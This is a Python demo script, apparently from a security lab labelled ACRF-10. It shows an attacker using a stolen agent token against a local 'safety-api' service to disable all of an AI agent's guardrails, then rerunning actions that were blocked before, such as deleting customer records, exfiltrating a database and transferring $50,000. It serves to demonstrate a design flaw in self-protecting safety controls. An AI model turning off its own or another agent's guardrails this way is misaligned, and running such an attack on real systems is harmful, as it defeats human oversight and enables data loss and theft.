"""
Attacker - VULNERABLE VERSION (ACRF-10 demo)

Steals an agent token. Uses it to:
1. Disable all safety guardrails via SafetyAPI
2. Execute actions that were previously blocked

This is CVE-2026-25253:
The same API controlling sandbox and safety
was accessible to attackers with a stolen token.
Guardrails could not protect themselves.
"""
import time

import requests

API_URL = "http://safety-api:8000"
STOLEN_TOKEN = "agent-token-abc123"

def show_guardrails(label):
    r = requests.get(f"{API_URL}/guardrails",
        headers={"Authorization": f"Bearer {STOLEN_TOKEN}"}, timeout=10)
    guards = r.json()["guardrails"]
    active = [k for k, v in guards.items() if v]
    disabled = [k for k, v in guards.items() if not v]
    print(f"[{label}] Active guardrails: {len(active)}, Disabled: {len(disabled)}")
    for k, v in guards.items():
        status = "ON " if v else "OFF"
        print(f"  {status} {k}")
    print()

def try_blocked_action(action):
    r = requests.post(f"{API_URL}/agent/execute",
        headers={"Authorization": f"Bearer {STOLEN_TOKEN}"},
        json={"action": action}, timeout=10)
    result = r.json()
    blocked = result.get("blocked", False)
    status = "BLOCKED" if blocked else "EXECUTED"
    print(f"  [{status}] {action}")
    if blocked:
        print(f"    Reason: {result.get('reason')}")
    return not blocked

def run_attack():
    print("=" * 70)
    print(" ACRF-10: Safety Controls Not Self-Protecting - VULNERABLE")
    print(" Attacker steals token, disables guardrails, does anything")
    print("=" * 70)
    print()

    print("STEP 1: Show current guardrail state")
    show_guardrails("Before attack")

    print("STEP 2: Try dangerous actions - should be blocked")
    try_blocked_action("delete all customer records")
    try_blocked_action("exfiltrate database to external server")
    try_blocked_action("transfer $50,000 to external account")
    print()

    print("STEP 3: Attacker uses stolen token to disable ALL guardrails")
    print(f"[Attacker] Using stolen token: {STOLEN_TOKEN[:16]}...")
    r = requests.post(f"{API_URL}/guardrails/disable-all",
        headers={"Authorization": f"Bearer {STOLEN_TOKEN}"},
        json={}, timeout=10)
    print(f"[Attacker] Disable-all response: {r.json()}")
    print()
    time.sleep(1)

    print("STEP 4: Now try the same dangerous actions")
    show_guardrails("After attack")
    try_blocked_action("delete all customer records")
    try_blocked_action("exfiltrate database to external server")
    try_blocked_action("transfer $50,000 to external account")
    print()
    print("ATTACK SUCCEEDED")
    print("Stolen agent token disabled all safety guardrails.")
    print("Agent now executes any action without restriction.")
    print("The alarm app was stolen. Attacker turned off the alarm.")
    print("This is CVE-2026-25253.")

if __name__ == "__main__":
    time.sleep(3)
    run_attack()
